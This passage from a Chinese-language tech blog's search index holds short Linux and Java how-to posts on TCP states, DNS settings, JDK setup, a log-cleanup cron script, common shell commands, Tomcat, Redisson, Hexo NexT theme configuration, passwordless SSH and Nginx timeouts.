<h3 id="State"><a href="#State" class="headerlink" title="State"></a>State</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">常用的狀態是：</span><br><span class="line">ESTABLISHED 表示正在通信</span><br><span class="line">TIME_WAIT 表示主動關閉</span><br><span class="line">CLOSE_WAIT 表示被動關閉</span><br><span class="line"></span><br><span class="line">CLOSED 			表示socket連結未使用</span><br><span class="line">LISTENING 		表示正等待監聽的連結</span><br><span class="line">SYN_SENT 		表示正在試著建立連結</span><br><span class="line">SYN_RECEIVED 	進行連結初始同步</span><br><span class="line">ESTABLISHED 	表示連結已被建立</span><br><span class="line">CLOSE_WAIT 		表示遠端主機關閉連結，正在等待socket連結的關閉</span><br><span class="line">FIN_WAIT_1 		表示socket連結關閉，正在關閉連結</span><br><span class="line">CLOSING 		先關閉本地socket連結，然後關閉遠端socket連結，最後等待確認訊息</span><br><span class="line">LAST_ACK 		遠端主機關閉後，等待確認信號</span><br><span class="line">FIN_WAIT_2 		socket連結關閉後，等待來自遠端主機的關閉信號</span><br><span class="line">TIME_WAIT 		連結關閉後，等待遠端主機關閉重送</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>TCP</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Ping DomainName 報錯 Nameor Service NotKnown</title>
    <url>/posts/256c37e1/</url>
    <content><![CDATA[<h3 id="LinuxPingDomainName報錯NameorServiceNotKnown"><a href="#LinuxPingDomainName報錯NameorServiceNotKnown" class="headerlink" title="LinuxPingDomainName報錯NameorServiceNotKnown"></a>LinuxPingDomainName報錯NameorServiceNotKnown</h3><span id="more"></span>
<p>這篇文章是在Linux上，ping一個外部網址時出現Name or service not known錯誤。<br>原因是要設定dns設定，該網址才會被解析。</p>
<h3 id="設定語法"><a href="#設定語法" class="headerlink" title="設定語法"></a>設定語法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vi /etc/resolv.conf</span><br><span class="line">$ nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux多組nameserver設定</title>
    <url>/posts/21773b49/</url>
    <content><![CDATA[<h3 id="Linux多組nameserver設定"><a href="#Linux多組nameserver設定" class="headerlink" title="Linux多組nameserver設定"></a>Linux多組nameserver設定</h3><span id="more"></span>
<p>在Linux上的DNS伺服器的IP可以設定多個，為什麼要設定多個呢？<br>因為當第一部 (照設定的順序) DNS 掛點時，我們用戶端可以使用第二部(下述是 1.1.1.1 是 CloudFlare)來進行查詢，<br>有點像是DNS的備援功能。通常建議至少填寫兩部 DNS 伺服器的IP，不過在網路正常使用的情況下，<br>永遠只有第一部 DNS 伺服器會被使用來查詢，其他的設定值只是在第一部出問題時才會被使用。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Generated by NetworkManager</span></span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 1.1.1.1</span><br></pre></td></tr></table></figure>

<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>盡量不要設定超過3部以上的 DNS IP 在 &#x2F;etc&#x2F;resolv.conf 中，因為如果是你的區網出問題，<br>將導致無法連線到 DNS 伺服器，那麼你的主機還是會向每部 DNS 伺服器發出連線要求，<br>每次連線都有 timeout 時間的等待，會導致浪費非常多的時間喔！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>nameserver</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安裝Java JDK注意事項</title>
    <url>/posts/28845134/</url>
    <content><![CDATA[<h3 id="Linux安裝Java-JDK注意事項"><a href="#Linux安裝Java-JDK注意事項" class="headerlink" title="Linux安裝Java JDK注意事項"></a>Linux安裝Java JDK注意事項</h3><span id="more"></span>
<p>Step1: 先至 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzL3p1bHUtY29tbXVuaXR5Lz8mdmVyc2lvbj1qYXZhLTgtbHRz">https://www.azul.com/downloads/zulu-community/?&amp;version=java-8-lts<i class="fa fa-external-link-alt"></i></span> 下載所需要的JDK File<br>Step2: 若是下載Linux版本，請不要在windows系統解壓縮後放至Linux上，會造成bin資料夾可執行屬性不見<br>       建議將.tar.gz檔案上傳至Linux，進行解壓縮的方式安裝</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar zxvf zulu8.40.0.178-ca-jdk1.8.0_222-linux_aarch32hf.tar.gz</span><br></pre></td></tr></table></figure>
<p>Step3: 確認JDK版本是否正確</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p>Step4: 若java -version不是新版本，需用以下指令修正bin資料夾的屬性</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 754</span><br></pre></td></tr></table></figure>
<p>————-Memo—————<br>執行以下指令如沒有出現版本時，請檢查 ~&#x2F;.bashrc有沒有設定JAVA_HOME路徑</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p>檢查JAVA_HOME路徑指令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$JAVA_HOME</span></span><br></pre></td></tr></table></figure>
<p>~&#x2F;.bashrc設定檔</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .bashr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User specific aliases and functions</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">rm</span>=<span class="string">&#x27;rm -i&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">cp</span>=<span class="string">&#x27;cp -i&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">mv</span>=<span class="string">&#x27;mv -i&#x27;</span></span><br><span class="line"></span><br><span class="line">JAVA_HOME=/usr/local/java/latest</span><br><span class="line">PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin</span><br><span class="line">JAVA_OPTS=<span class="string">&quot;-XX:-TieredCompilation&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"><span class="built_in">export</span> JAVA_OPTS</span><br><span class="line"></span><br><span class="line"><span class="comment"># Source global definitions</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/bashrc ]; <span class="keyword">then</span></span><br><span class="line">        . /etc/bashrc</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Java JDK</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux使用ShellScripts刪除檔案</title>
    <url>/posts/aea435aa/</url>
    <content><![CDATA[<h3 id="Linux使用ShellScripts刪除檔案"><a href="#Linux使用ShellScripts刪除檔案" class="headerlink" title="Linux使用ShellScripts刪除檔案"></a>Linux使用ShellScripts刪除檔案</h3><span id="more"></span>
<p>先建立Shell Scripts檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">touch</span> clearLog.sh</span><br></pre></td></tr></table></figure>

<p>對.sh檔案編輯</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim clearLog.sh</span><br></pre></td></tr></table></figure>

<p>按INSERT來新增內容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># remove 10 to 100 days ago logs</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;10..100&#125;;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line"><span class="comment">#It&#x27;s for log name with the format like &quot;2019-01-01&quot; &amp; &quot;20190101&quot;.</span></span><br><span class="line">    check_date=`<span class="built_in">date</span> -d <span class="string">&quot;-<span class="variable">$i</span> day&quot;</span> <span class="string">&quot;+%Y-%m-%d&quot;</span>`</span><br><span class="line">    check_date1=`<span class="built_in">date</span> -d <span class="string">&quot;-<span class="variable">$i</span> day&quot;</span> <span class="string">&quot;+%Y%m%d&quot;</span>`</span><br><span class="line">    find /usr/local/uat_tomcat/logs/ -name <span class="string">&quot;*<span class="variable">$check_date</span>*&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br><span class="line">    find /usr/local/uat_tomcat/logs/ -name <span class="string">&quot;*<span class="variable">$check_date1</span>*&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>存檔指令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure>

<p>用crontab設定排程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">編輯</span><br><span class="line">$ crontab -e</span><br><span class="line">新增內容</span><br><span class="line"><span class="comment">#每天05:00A.M.執行</span></span><br><span class="line">0 5 * * * sh /root/clearLog.sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell Scripts</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用指令</title>
    <url>/posts/519ff8b5/</url>
    <content><![CDATA[<h3 id="Linux常用指令"><a href="#Linux常用指令" class="headerlink" title="Linux常用指令"></a>Linux常用指令</h3><span id="more"></span>
<p>切換root權限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ su -</span><br></pre></td></tr></table></figure>

<p>新增檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">touch</span> test.sh</span><br></pre></td></tr></table></figure>

<p>查本機對外IP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ curl ipconfig.me</span><br></pre></td></tr></table></figure>

<p>查看檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ less test.sh</span><br></pre></td></tr></table></figure>

<p>編輯檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim test.sh</span><br></pre></td></tr></table></figure>

<p>刪除檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">rm</span> -f test.sh</span><br></pre></td></tr></table></figure>

<p>查看硬碟空間</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">df</span></span><br></pre></td></tr></table></figure>

<p>複製檔案</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> -r /root/test.sh /root/test/test.sh</span><br></pre></td></tr></table></figure>

<p>scp檔案從目前Server複製檔案至另一台Server(保留檔案時間與權限)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ scp -p /root/test.sh root@10.10.10.10:/root/test.sh</span><br></pre></td></tr></table></figure>

<p>取得Linux安裝的系統版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>

<p>解壓縮.tar.gz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tar zxvf <span class="string">&quot;FileName&quot;</span>.tar.gz</span><br></pre></td></tr></table></figure>

<p>新建立使用者，先登入root權限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ useradd <span class="string">&quot;username&quot;</span></span><br></pre></td></tr></table></figure>
<p>替使用者新增密碼</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ passwd <span class="string">&quot;username&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Linux觀察系統資源常用指令"><a href="#Linux觀察系統資源常用指令" class="headerlink" title="Linux觀察系統資源常用指令"></a>Linux觀察系統資源常用指令</h3><p>效能分析工具，能夠即時顯示系統中各個行程的資源佔用狀況</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure>

<p>觀察系統啟動時間與工作負載</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">uptime</span></span><br></pre></td></tr></table></figure>

<p>查看記憶體的使用狀態</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ free -h</span><br></pre></td></tr></table></figure>

<p>查看特定process所使用Memory和CPU，依據使用記憶體排序</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ps -eo pid,ppid,cmd,%mem,%cpu --<span class="built_in">sort</span>=-%mem | grep java</span><br></pre></td></tr></table></figure>

<p>查看該使用者所使用process數量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ps -u <span class="string">&quot;User&quot;</span> -L | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<h3 id="Linux網路常用指令"><a href="#Linux網路常用指令" class="headerlink" title="Linux網路常用指令"></a>Linux網路常用指令</h3><p>查詢網路卡狀態</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ifconfig</span><br></pre></td></tr></table></figure>

<p>查看網路傳送的路由情況</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ route</span><br></pre></td></tr></table></figure>

<p>查看對方網路是否有通</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ping www.google.com.tw</span><br></pre></td></tr></table></figure>

<p>查詢或反查詢DNS </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nslookup www.google.com.tw</span><br><span class="line">$ nslookup 8.8.8.8</span><br></pre></td></tr></table></figure>

<p>追蹤通訊包傳送的狀態</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ traceroute www.google.com.tw</span><br><span class="line">$ traceroute 8.8.8.8</span><br></pre></td></tr></table></figure>

<p>查詢Local IP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ip addr show</span><br></pre></td></tr></table></figure>

<h3 id="查詢硬體指令-CPU…等"><a href="#查詢硬體指令-CPU…等" class="headerlink" title="查詢硬體指令(CPU…等)"></a>查詢硬體指令(CPU…等)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安裝vim</title>
    <url>/posts/1f0b4964/</url>
    <content><![CDATA[<h3 id="Linux安裝vim"><a href="#Linux安裝vim" class="headerlink" title="Linux安裝vim"></a>Linux安裝vim</h3><span id="more"></span>
<p>這篇介紹在CentOS上執行vim，如果出現-bash: vim: command not found時，如何解決~</p>
<h3 id="先檢查系統是否已安裝vim"><a href="#先檢查系統是否已安裝vim" class="headerlink" title="先檢查系統是否已安裝vim"></a>先檢查系統是否已安裝vim</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ rpm -qa|grep vim</span><br><span class="line">正常要出現以下三個</span><br><span class="line">vim-enhanced-7.4.629-6.el7.x86_64</span><br><span class="line">vim-common-7.4.629-6.el7.x86_64</span><br><span class="line">vim-minimal-7.4.160-5.el7.x86_64</span><br></pre></td></tr></table></figure>

<h3 id="如果三個少了其中一個，請用yum-y-install來安裝"><a href="#如果三個少了其中一個，請用yum-y-install來安裝" class="headerlink" title="如果三個少了其中一個，請用yum -y install來安裝"></a>如果三個少了其中一個，請用yum -y install來安裝</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ex:如果少了vim-enhanced，請執行以下指令</span><br><span class="line">$ yum -y install vim-enhanced</span><br></pre></td></tr></table></figure>

<h3 id="如果完全沒安裝過vim"><a href="#如果完全沒安裝過vim" class="headerlink" title="如果完全沒安裝過vim"></a>如果完全沒安裝過vim</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ yum -y install vim*</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux查詢Tomcat版本</title>
    <url>/posts/7ab48974/</url>
    <content><![CDATA[<h3 id="Linux查詢Tomcat版本"><a href="#Linux查詢Tomcat版本" class="headerlink" title="Linux查詢Tomcat版本"></a>Linux查詢Tomcat版本</h3><span id="more"></span>
<p>這篇介紹如何在Linux查詢Tomcat版本</p>
<h3 id="Linux查詢Tomcat版本-1"><a href="#Linux查詢Tomcat版本-1" class="headerlink" title="Linux查詢Tomcat版本"></a>Linux查詢Tomcat版本</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/tomcat/bin</span><br><span class="line">$ ./version.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">Using CATALINA_BASE:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_HOME:   /usr/local/apache/latest</span><br><span class="line">Using CATALINA_TMPDIR: /usr/local/tomcat/temp</span><br><span class="line">Using JRE_HOME:        /usr/local/java/latest</span><br><span class="line">Using CLASSPATH:       /usr/local/apache/latest/bin/bootstrap.jar:/usr/local/apache/latest/bin/tomcat-juli.jar</span><br><span class="line">Server version: Apache Tomcat/8.5.57</span><br><span class="line">Server built:   Jun 30 2020 21:49:10 UTC</span><br><span class="line">Server number:  8.5.57.0</span><br><span class="line">OS Name:        Linux</span><br><span class="line">OS Version:     3.10.0-957.el7.x86_64</span><br><span class="line">Architecture:   amd64</span><br><span class="line">JVM Version:    1.8.0_265-b11</span><br><span class="line">JVM Vendor:     Azul Systems, Inc.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Upgrade Redis Server And Redisson Client Memo</title>
    <url>/posts/6584b616/</url>
    <content><![CDATA[<h3 id="Upgrade-Redis-Server-And-Redisson-Client-Memo"><a href="#Upgrade-Redis-Server-And-Redisson-Client-Memo" class="headerlink" title="Upgrade Redis Server And Redisson Client Memo"></a>Upgrade Redis Server And Redisson Client Memo</h3><span id="more"></span>
<p>這篇介紹Upgrade Redis Server And Redisson Client Memo。</p>
<h3 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">從Redisson client 3.17.7 升級至 3.23.2，這邊要注意的是yaml設定的</span><br><span class="line">codec: !&lt;org.redisson.codec.MarshallingCodec&gt; &#123;&#125; 必須一致。否則會</span><br><span class="line">遇到編碼錯誤。</span><br><span class="line"></span><br><span class="line">由於Redisson的codec 是由 Redisson yaml決定，且Redisson一直在更換</span><br><span class="line">編碼。如果Redis Server原本是設置成Persistence的話，要使用新編碼就</span><br><span class="line">會有資料備份的問題。如果Redis Server的資料不是Persistence，只要yaml</span><br><span class="line">的codec前後一致，基本上是不會遇到升級的問題。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>List addAll() Unsupported Operation Exception</title>
    <url>/posts/f65bcd9e/</url>
    <content><![CDATA[<h3 id="List執行addAll-出現UnsupportedOperationException"><a href="#List執行addAll-出現UnsupportedOperationException" class="headerlink" title="List執行addAll()出現UnsupportedOperationException"></a>List執行addAll()出現UnsupportedOperationException</h3><span id="more"></span>
<p>這篇介紹List執行addAll()出現UnsupportedOperationException。</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Arrays.asList to list時，執行addAll加入List元素出錯</span><br><span class="line">java.lang.UnsupportedOperationException: null</span><br><span class="line"></span><br><span class="line">因Arrays.asList是固定長度的List且不具備add remove...方法，請慎用</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">new ArrayList&lt;T&gt;(Arrays.asList()) 取代 Arrays.asList()</span><br><span class="line">就可以執行 List.addAll(List)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Collection</category>
      </categories>
      <tags>
        <tag>Collection</tag>
        <tag>List</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro NextT Customized function</title>
    <url>/posts/6f55f78d/</url>
    <content><![CDATA[<h3 id="Intro-NextT-Customized-function"><a href="#Intro-NextT-Customized-function" class="headerlink" title="Intro NextT Customized function"></a>Intro NextT Customized function</h3><span id="more"></span>
<p>這篇介紹NextT Customized function。</p>
<h3 id="pjax"><a href="#pjax" class="headerlink" title="pjax"></a>pjax</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pjax 實現了 URL 改變但不重新整理整個頁面，也就是只有局部的頁面會更新，不會讓整個頁面重新閃動(重新整理)。</span><br><span class="line"></span><br><span class="line">修改 /themes/next/_config.yml</span><br><span class="line"><span class="comment"># Easily enable fast Ajax navigation on your website.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-pjax</span></span><br><span class="line">pjax: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">安裝lib</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pjax themes/next/source/lib/pjax</span><br></pre></td></tr></table></figure>

<h3 id="Symbols-count-amp-Reading-time-in-article"><a href="#Symbols-count-amp-Reading-time-in-article" class="headerlink" title="Symbols count &amp; Reading time in article"></a>Symbols count &amp; Reading time in article</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改 /themes/next/_config.yml</span><br><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span></span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: <span class="literal">true</span> <span class="comment"># 是否&quot;換行顯示&quot;字數統計及閱讀時長</span></span><br><span class="line">  item_text_post: <span class="literal">false</span> <span class="comment"># 字數統計和閱讀時長是要使用小圖示(true)還是文字表示(false)</span></span><br><span class="line">  item_text_total: <span class="literal">false</span> <span class="comment"># 文章底部的字數統計和閱讀時長是要使用小圖示(true)還是文字表示(false)</span></span><br><span class="line"></span><br><span class="line">安裝lib</span><br><span class="line">$ npm install hexo-symbols-count-time --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">symbols_count_time:</span><br><span class="line">  symbols: <span class="literal">true</span> <span class="comment"># 文章是否顯示字數統計</span></span><br><span class="line">  time: <span class="literal">true</span> <span class="comment"># 文章是否顯示閱讀時間</span></span><br><span class="line">  total_symbols: <span class="literal">true</span> <span class="comment"># 網頁底部是否顯示字數統計</span></span><br><span class="line">  total_time: <span class="literal">true</span> <span class="comment"># 網頁底部是否顯示閱讀時間</span></span><br><span class="line">  exclude_codeblock: <span class="literal">false</span> <span class="comment"># 排除程式碼字數統計</span></span><br><span class="line">  awl: 2  <span class="comment">#平均文字長度，中文為 2, 英文為 5, 預設為 4</span></span><br><span class="line">  wpm: 275  <span class="comment">#一分鐘閱讀字數，預設為 275</span></span><br><span class="line">  suffix: <span class="string">&quot;分鐘&quot;</span></span><br><span class="line"> </span><br><span class="line">memo:加在檔案最下方即可</span><br></pre></td></tr></table></figure>

<h3 id="search-in-article"><a href="#search-in-article" class="headerlink" title="search in article"></a>search in article</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改 /themes/next/_config.yml</span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">安裝lib</span><br><span class="line">$ npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: <span class="literal">true</span></span><br><span class="line">  format: html</span><br><span class="line"> </span><br><span class="line">memo:加在檔案最下方即可</span><br></pre></td></tr></table></figure>

<h3 id="processbar"><a href="#processbar" class="headerlink" title="processbar"></a>processbar</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改 /themes/next/_config.yml</span><br><span class="line"><span class="comment"># Progress bar in the top during page loading.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-pace</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/HubSpot/pace</span></span><br><span class="line">pace:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span>  <span class="comment">#false 改成 true</span></span><br><span class="line"></span><br><span class="line">安裝lib</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pace themes/next/source/lib/pace</span><br></pre></td></tr></table></figure>

<h3 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">「Sitemap」是一種用來提供網站資訊的檔案，您可以在其中列出網頁、影片和其他檔案的資訊，</span><br><span class="line">並呈現這些內容彼此間的關係。Google 等搜尋引擎都會讀取網站的 Sitemap 檔案，</span><br><span class="line">藉此以更有效率的方式檢索網站。</span><br><span class="line"></span><br><span class="line">安裝lib</span><br><span class="line">$ npm install hexo-generator-sitemap --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">sitemap:</span><br><span class="line">  path: sitemap.xml</span><br><span class="line">  tags: <span class="literal">false</span></span><br><span class="line">  categories: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">memo:加在檔案最下方即可</span><br></pre></td></tr></table></figure>

<h3 id="加入背景圖片"><a href="#加入背景圖片" class="headerlink" title="加入背景圖片"></a>加入背景圖片</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改 /themes/next/_config.yml</span><br><span class="line">custom_file_path:</span><br><span class="line">  style: <span class="built_in">source</span>/_data/styles.styl</span><br><span class="line">  </span><br><span class="line">加入檔案/root/source/_data/styles.styl</span><br><span class="line"></span><br><span class="line">styles.styl內容:</span><br><span class="line">body &#123;</span><br><span class="line">      background:url(/images/background.jpg);</span><br><span class="line">      background-size: cover;</span><br><span class="line">      background-repeat: no-repeat;</span><br><span class="line">      background-attachment: fixed;</span><br><span class="line">      background-position:center center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">背景圖片需放/root/source/images/background.jpg</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NextT</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NextT</tag>
      </tags>
  </entry>
  <entry>
    <title>No Password To Login Linux Server Setting</title>
    <url>/posts/9ff888b8/</url>
    <content><![CDATA[<h3 id="Intro-No-Password-To-Login-Linux-Server-Setting"><a href="#Intro-No-Password-To-Login-Linux-Server-Setting" class="headerlink" title="Intro No Password To Login Linux Server Setting"></a>Intro No Password To Login Linux Server Setting</h3><span id="more"></span>
<p>這篇介紹No Password To Login Linux Server Setting。</p>
<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">請先按照上一篇 https://davidchenblog.com/posts/52df344/?highlight=login</span><br><span class="line">設定</span><br><span class="line"></span><br><span class="line">設定完後需下指令</span><br><span class="line">$ ssh-copy-id root@xxx.xxx.xxx.xxx</span><br><span class="line">需輸入這台linux server password</span><br><span class="line">即可設定完成</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx Error Code 110 Operation timed out</title>
    <url>/posts/f20d6743/</url>
    <content><![CDATA[<h3 id="Intro-Nginx-Error-Code-110-Operation-timed-out"><a href="#Intro-Nginx-Error-Code-110-Operation-timed-out" class="headerlink" title="Intro Nginx Error Code 110 Operation timed out"></a>Intro Nginx Error Code 110 Operation timed out</h3><span id="more"></span>
<p>這篇介紹Nginx Error Code 110 Operation timed out。</p>
<h3 id="Nginx-error-log"><a href="#Nginx-error-log" class="headerlink" title="Nginx error log"></a>Nginx error log</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">出現upstream timed out (110: Operation timed out) <span class="keyword">while</span> connecting to upstream</span><br><span class="line"></span><br><span class="line">代表到達<span class="built_in">timeout</span></span><br><span class="line"></span><br><span class="line">解決方法</span><br><span class="line">1.先調長<span class="built_in">timeout</span>再觀察是否還有其它錯誤</span><br><span class="line"></span><br><span class="line">proxy_read_timeout 120;   	===&gt; proxy_read_timeout 600;</span><br><span class="line">proxy_connect_timeout 120;	===&gt; proxy_connect_timeout 600;</span><br><span class="line">proxy_send_timeout 120;		===&gt; proxy_send_timeout 600;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>ORA-01440: column to be modified must be empty to decrease precision or scale</title>
    <url>/posts/bcfeb897/</url>
    <content><![CDATA[<h3 id="ORA-01440-column-to-be-modified-must-be-empty-to-decrease-precision-or-scale"><a href="#ORA-01440-column-to-be-modified-must-be-empty-to-decrease-precision-or-scale" class="headerlink" title="ORA-01440: column to be modified must be empty to decrease precision or scale"></a>ORA-01440: column to be modified must be empty to decrease precision or scale</h3><span id="more"></span>
